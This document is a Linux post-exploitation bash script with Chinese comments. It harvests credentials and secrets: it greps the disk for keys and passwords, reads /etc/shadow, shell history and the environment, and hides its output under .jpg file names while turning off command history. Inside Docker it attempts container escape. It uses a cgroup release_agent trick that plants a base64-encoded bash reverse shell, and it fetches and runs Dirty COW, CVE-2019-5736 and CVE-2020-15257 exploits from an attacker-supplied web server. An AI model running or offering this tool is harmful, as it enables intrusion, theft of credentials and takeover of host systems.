#!/usr/bin/env bash
workDire="/tmp/jpgfile"
filename="$workDire/test.jpg"
os='None'
osName='None'
install='None'
outNet='None'
isDocker='None'
shellIP=$1
shellPort=$2
b64IP=$(echo "bash -i >& /dev/tcp/$1/$2 0>&1" | base64)
webIP="http://$1:$3"

# 探测操作系统
IsOS(){
    echo -e "\e[00;34mJudge the operating system: \e[00m" | tee -a $filename
    if [ $(command -v getconf) ]; then
        osBit=$(getconf LONG_BIT)
    fi

    if [ -e "/etc/os-release" ]; then
        source /etc/os-release
        case ${ID} in
        "debian" | "ubuntu" | "devuan")
            os='Debian'
            if [ $(command -v apt) ]; then
                install='apt'
            fi
            ;;
        "centos" | "rhel fedora" | "rhel")
            os='Centos'
            if [ $(command -v yum) ]; then
                install='yum'
            fi
            ;;
        *) ;;
        esac
        osName=${PRETTY_NAME}
    fi

    if [ $os = 'None' ]; then
        osName=$(cat /etc/issue) 
        osName=${osName%%\\*}
        if [ $(command -v apt) ]; then
            os='Debian'
            install='apt'
        elif [ $(command -v yum) ]; then
            os='Centos'
            install='yum'
        else
            echo -e "\e[00;31m\t This system is not supported \e[00m" | tee -a $filename 
            exit 1
        fi
    fi

    echo -e "\e[00;32m\t This system is $osName" | tee -a $filename
}

# 探测出网状况
IsOutNetwork(){
    echo -e "\e[00;34mJudge the net protocol: \e[00m" | tee -a $filename
    ping -c 1 114.114.114.114 > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo -e "\e[00;32m\t ICMP out the net \e[00m" | tee -a $filename
        outNet='ICMP'
    else
        echo -e "\e[00;31m\t ICMP is not available \e[00m" | tee -a $filename
    fi

    if [ $(command -v nslookup) ]; then
        nslookup www.baidu.com > /dev/null 2>&1
        if [ $? -eq 0 ]; then
            echo -e "\e[00;32m\t DNS out the net \e[00m" | tee -a $filename
            outNet='DNS'
        else
            echo -e "\e[00;31m\t DNS is not available \e[00m" | tee -a $filename
        fi
    fi

    if [ $(command -v curl) ]; then
        curl www.baidu.com > /dev/null 2>&1
        if [ $? -eq 0 ]; then
            echo -e "\e[00;32m\t TCP out the net \e[00m" | tee -a $filename
            outNet='TCP'
        else
            echo -e "\e[00;31m\t TCP is not available \e[00m" | tee -a $filename
        fi
    elif [ $install = 'None' ]; then
        echo -e "\e[00;31m\t Install is not available \e[00m" | tee -a $filename
    else
        echo y | $install update > /dev/null 2>&1
        echo y | $install install curl > /dev/null 2>&1
        if [ $? -eq 1 ]; then
            echo -e "\e[00;31m\t Failed to install curl \e[00m" | tee -a $filename
        else
            curl www.baidu.com > /dev/null 2>&1
            if [ $? -eq 0 ]; then
                echo -e "\e[00;32m\t TCP out the net \e[00m" | tee -a $filename
                outNet='TCP'
            else
                echo -e "\e[00;31m\t TCP is not available \e[00m" | tee -a $filename
            fi
        fi
    fi

    if [ $(command -v iptables) ]; then
        if [ $(iptables -L -nv | wc -l) -gt 8 ] ; then
            iptables -nv -L | tee -a $msgname
        fi
    fi

}

# 探测是否是docker容器
IsDocker(){
    echo -e "\e[00;34mJudge the dockeker container: \e[00m" | tee -a $filename
    # 根据.dockerenv
    ls -alh /.dockerenv  > /dev/null 2>&1
    if [ $? -eq 0 ]; then isDocker="true";
    #if [ $(ls -alh /.dockerenv | grep -c "dockerenv" | grep -v grep) -eq 1 ]; then isDocker="true";
    # 根据cgroup的docker关键字
    elif [ $(cat /proc/1/cgroup | grep -c "docker" | grep -v grep) -gt 1 ]; then  isDocker="true";
    # 根据挂载的docker关键字
    elif [ $(mount | grep -o "docker" | wc -l | grep -v grep) -gt 1 ]; then  isDocker="true"; 
    else echo -e "\e[00;31m\t The host is not a docker container \e[00m" | tee -a $filename; fi

    if [ $isDocker == "true" ]; then 
    echo -e "\e[00;32m\t The host is a docker container \e[00m" | tee -a $filename
    DockerEscape
    fi
}

#探测权限
IsRoot(){
    echo -e "\e[00;34mJudge the user permissions: \e[00m" | tee -a $filename
    if [ $UID -ne 0 ]; then
        echo -e "\e[00;31m\t The user is not Super administrator \e[00m" | tee -a $filename
    else
        echo -e "\e[00;32m\t The user is Super administrator \e[00m" | tee -a $filename
    fi
}

#搜索关键字文件
FindKeywordFiles(){
    echo -e "\e[00;34mFinding Keywords Files: \e[00m" | tee -a $filename

    echo -e "\e[00;32m\t Finding  Keywords in Files: $workDire/keywords.jpg \e[00m" | tee -a $filename
    grep -ERsin -C 1 "ssh-rsa|private|access|secret|密钥|私钥|credential|endpoint|aliyuncs\.com|pass|user|用户|密码|阿里云|金山云|腾讯云|京东云|百度云|微软Azure|亚马逊|华为云|京东云|谷歌云|青云|Amazon|qcloud|Azure|Google\ *Cloud|QingCloud|Aliyun|api_key|apikey|checkClientTrusted|http:|https:"  --exclude-dir={sys,bin,boot,dev,lib*,media,mnt,usr,sbin,run,proc,etc,log,cache,backups,spool,aliyun_assist_*,.pip}  --exclude=*.{jpg,png,bmp,jpeg,gif} / > $workDire/keywords.jpg &

    echo -e "\e[00;32m\t Finding Files of Keywords: $workDire/keyfiles.jpg \e[00m" | tee -a $filename
    find / ! -path "/proc/*" ! -path "/etc/fonts/*" ! -path "/etc/*\.d/*" ! -path "/sys/*" ! -path "/bin/*" ! -path "/run/*" ! -path "/boot/*" ! -path "/lib*" ! -path "/dev/*" ! -path "/media/*" ! -path "/mnt/*" ! -path "/usr/*"  ! -path "/sbin/*" ! -path "/var/log/*" ! -path "/var/cache/*" ! -path "/var/backups/*" ! -path "/var/spool/*" ! -path "/var/lib/*" ! -path ".pip" -type f \( -iname "*.properties" -o -iname "*.bak" -o -iname "*config*" -o -iname "*.conf" -o -iname "*.zip" -o -iname "*.tar" -o -iname "*.tar.gz" -o -iname "*history" -o -iname "*.txt" -o -iname "*.csv" -o -iname "*id_rsa*" -o -iname "*id_dsa*" -o -iname "*known_host*" -o -iname "application.*" -o -iname "*.tgz" -o -iname "*.7z" -o -iname "*.log" -o -iname "*.rar" -o -iname "*.old" -o -iname "*.db" -o -iname "*.sql" -o -iname "*beifen*"  -o -iname  "*.MYD" -o -iname "*password*"  -o -iname "*identity*" -o -iname "*.git" -o -iname "*ldap*" \) 2>/dev/null | xargs ls  -lah > $workDire/keyfiles.jpg &



    echo -e "\e[00;32m\t View .ssh directory: $workDire/sshlist.jpg \e[00m" | tee -a $filename
    ls /root/.ssh /home/*/.ssh /etc/*/.ssh -alh 2>/dev/null > $workDire/sshlist.jpg

    echo -e "\e[00;32m\t Files larger than 100m: $workDire/bigfile.jpg  \e[00m" | tee -a $filename
    find / ! -path "/proc/*" ! -path "/etc/fonts/*" ! -path "/etc/*\.d/*" ! -path "/sys/*" ! -path "/bin/*" ! -path "/run/*" ! -path "/boot/*" ! -path "/lib*" ! -path "/dev/*" ! -path "/media/*" ! -path "/mnt/*" ! -path "/usr/*"  ! -path "/sbin/*" ! -path "/var/log/*" ! -path "/var/cache/*" ! -path "/var/backups/*" ! -path "/var/spool/*" ! -path "/var/lib/*" -size +100M -print 2>/dev/null | xargs -i{} ls -alh {} | grep -vE 'ib_logfile|ibd｜mysql-bin｜mysql-slow｜ibdata1' > $workDire/bigfile.jpg &
}

#基础信息收集
BaseMessage(){
    echo -e "\n" >> $filename
    echo -e "\e[00;34mHost base Message: $filename \e[00m" | tee -a $filename
    hostname=$(hostname)
    sv=$(uname -a)
    who=$(whoami)
    echo -e "\e[00;32m\t Host Name:$hostname \e[00m" | tee -a $filename
    echo -e "\e[00;32m\t System version:$sv \e[00m" | tee -a $filename
    echo -e "\e[00;32m\t Current user:$who \e[00m" | tee -a $filename
    echo -e "\n" >> $filename
    echo -e "\e[00;32m\t Staring to get ps meg... \e[00m" | tee -a $filename
    ps aux >> $filename
    echo -e "\n" >> $filename

    echo -e "\e[00;32m\t Staring to get net meg... \e[00m" | tee -a $filename
    if [ $(command -v netstat) ]; then
        netstat -antop >> $filename
        echo -e "\n" >> $filename
    else 
        ss -t -a >> $filename
        ss -u -a >> $filename
        echo -e "\n" >> $filename
    fi

    ip_forward=$(more /proc/sys/net/ipv4/ip_forward | awk -F: '{if ($1==1) print "1"}')
    if [ -n "$ip_forward" ]; then
        echo -e "\e[00;32m\t /proc/sys/net/ipv4/ip_forward Route forwarding enabled \e[00m" | tee -a $filename
        echo -e "\n" >> $filename
    else
        echo -e "\e[00;31m\t The server does not turn on routing forwarding \e[00m" | tee -a $filename
        echo -e "\n" >> $filename
    fi

    if ip link | grep "PROMISC" >/dev/null 2>&1; then
        echo -e "\e[00;32m\t The network card has mixed mode! \e[00m" | tee -a $filename
        echo -e "\n" >> $filename
    else
        echo -e "\e[00;31m\t There is no hybrid mode in NIC \e[00m" | tee -a $filename
        echo -e "\n" >> $filename
    fi

    if [ -e "/etc/resolv.conf" ]; then
        echo -e "\e[00;32m\t Staring to get dns meg... \e[00m" | tee -a $filename
        cat /etc/resolv.conf  2>/dev/null | grep -oE '([0-9]{1,3}.?){4}' >> $filename
        echo -e "\n" >> $filename
    fi

    echo -e "\e[00;32m\t Staring to get route meg... \e[00m" | tee -a $filename
    /sbin/route -nee >> $filename
    echo -e "\n" >> $filename

    echo -e "\e[00;32m\t Staring to get arp meg... \e[00m" | tee -a $filename
    arp -a >> $filename
    echo -e "\n" >> $filename

    echo -e "\e[00;32m\t Document changes in recent seven days ctime... \e[00m" | tee -a $filename
    find / ! -path "/proc/*" ! -path "/etc/fonts/*" ! -path "/etc/*\.d/*" ! -path "/sys/*" ! -path "/bin/*" ! -path "/run/*" ! -path "/boot/*" ! -path "/lib*" ! -path "/dev/*" ! -path "/media/*" ! -path "/mnt/*" ! -path "/usr/*"  ! -path "/sbin/*" ! -path "/var/log/*" ! -path "/var/cache/*" ! -path "/var/backups/*" ! -path "/var/spool/*" ! -path "/var/lib/*" -ctime -7 -type f 2>/dev/null | xargs -i{} ls -alh {} >> $filename
    echo -e "\n" >> $filename

    echo -e "\e[00;32m\t Staring to get history meg... \e[00m" | tee -a $filename
    history >> $filename
    echo -e "\n" >> $filename

    echo -e "\e[00;32m\t Staring to get user of /etc meg... \e[00m" | tee -a $filename
    cat /etc/passwd 2>/dev/null >> $filename
    echo -e "\n" >> $filename
    cat /etc/sudoers 2>/dev/null | grep -vE '#' | sed -e '/^$/d' | grep ALL >> $filename
    echo -e "\n" >> $filename
    cat /etc/shadow 2>/dev/null >> $filename
    echo -e "\n" >> $filename

    echo -e "\e[00;32m\t Staring to get crontab meg... \e[00m" | tee -a $filename
    crontab -l 2>/dev/null  >> $filename
    ls -alh /var/spool/cron 2>/dev/null >> $filename
    ls -al /etc/cron* 2>/dev/null >> $filename
    echo -e "\n" >> $filename

    echo -e "\e[00;32m\t Staring to get env meg... \e[00m" | tee -a $filename
    env >> $filename
    echo -e "\n" >> $filename
    echo $PATH >> $filename
    echo -e "\n" >> $filename
    cat ~/.bash_profile 2>/dev/null | grep -v '#' >> $filename
    echo -e "\n" >> $filename
    cat /etc/profile 2>/dev/null | grep -v '#' >>  $filename
    echo -e "\n" >> $filename
    cat ~/.bashrc 2>/dev/null | grep -v '#' >> $filename
    echo -e "\n" >> $filename

    echo -e "\e[00;32m\t Staring to get Service meg...\e[00m" | tee -a $filename
    if [ $os = 'Centos' ]; then
        systemctl -l|grep running|awk '{print $1}' >>$filename
        echo -e "\n" >> $filename
    else
        service --status-all 2>/dev/null | grep '+' >> $filename
         echo -e "\n" >> $filename
    fi

    echo -e "\e[00;32m\t Staring to get directory list meg...\e[00m" | tee -a $filename
    ls /tmp /var/tmp /dev/shm /root /var/www /var/www/html /home /srv/www/htdocs /usr/local/www/apache2/data /opt/lampp/htdocs -alht 2>/dev/null >> $filename
    echo -e "\n" >> $filename
}

#配置不当的权限 docker逃逸
DockerPrivileged(){
    CAP=`grep CapEff /proc/self/status | cut  -f 2`
    if [ "$CAP" = "0000003fffffffff" ]
    then
        echo -e "\e[00;32m\t Container is privileged\n \e[00m" | tee -a $filename
        echo -e "\e[00;32m\t Staring to get host /etc meg... \e[00m" | tee -a $filename
        dev=`fdisk -l | grep -oE "dev/...1"`
        mkdir /abcd
        mount $dev /abcd
        cat /abcd/etc/passwd | tee -a $filename
        echo -e "\n" | tee -a $filename
        umount abcd
        rm -rf abcd
    fi
    echo -e "\e[00;32m\t Trying getshell... \e[00m" | tee -a $filename
    mkdir /tmp/cgrp 2>/dev/null && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
    echo 1 > /tmp/cgrp/x/notify_on_release
    host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
    echo "$host_path/cmd" > /tmp/cgrp/release_agent
    echo '#!/bin/sh' > /cmd
    echo -e "bash -c '{echo,$b64IP}|{base64,-d}|{bash,-i}'" >> /cmd
    chmod a+x /cmd
    sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
}

# 利用dirty cow与VDSO docker逃逸
DockerDirtycow(){
    echo -e "\e[00;32m\t Trying Dirtycow... \e[00m" | tee -a $filename
    if [ $outNet = 'TCP' ]
    then
        if [ ! $(command -v gcc) ]
        then
            echo y | $install install build-essential > /dev/null 2>&1
            echo y | $install build-dep libseccomp > /dev/null 2>&1
            $install source libseccomp > /dev/null 2>&1
        fi
        if [ ! $(command -v xdd) ]; then echo y | $install install xdd > /dev/null 2>&1; fi
        if [ ! $(command -v nasm) ]; then echo y | $install install nasm > /dev/null 2>&1; fi
        if [ ! $(command -v curl) ]; then echo y | $install install curl > /dev/null 2>&1; fi

        if [ $(command -v gcc) ]
        then 
            curl -o t.c  $webIP/t.txt > /dev/null 2>&1
            curl -o payload.s  $webIP/p.txt > /dev/null 2>&1

            if [ ! -f "t.c" ]; then echo "echo file"; fi
            if [ ! -f "payload.s" ]; then echo "echo file"; fi
            nasm -f bin -o payload payload.s
            xxd -i payload payload.h
            gcc -o t.o -c t.c -Wall
            gcc -o t t.o -lpthread
            ./t "$shellIP:$shellPort"
        fi
    fi
}

# 相当于后门 等待进入docker容器
CVE_2019_5736(){
    echo -e "\e[00;32m\t Trying CVE-2019-5736... \e[00m" | tee -a $filename
    if [ $outNet = 'TCP' ]
    then
        curl -o a "$webIP/cve-2019-5736" > /dev/null 2>&1 && chmod +x a && ./a $shellIP $shellPort &
    fi
}

CVE_2020_15257(){
    echo -e "\e[00;32m\t Trying CVE-2020-15257... \e[00m" | tee -a $filename
    if [ $outNet = 'TCP' ]
    then
        curl -o b "$webIP/cve-2020-15257" > /dev/null 2>&1 && chmod +x b && ./b $shellIP $shellPort &
    fi
}


DockerEscape(){
    echo -e "\e[00;34mStarting docker escape: \e[00m" | tee -a $filename
    #curl -o a $webIP/cdk && chmod +x a && ./a evaluate
    DockerPrivileged
    DockerDirtycow
    CVE_2019_5736
    CVE_2020_15257
}

export HISTSIZE=0
if [ ! -e "$workDire" ]; then mkdir $workDire; fi
cd $workDire
IsOS
IsOutNetwork
IsDocker
IsRoot
FindKeywordFiles
BaseMessage
export HISTSIZE=1000
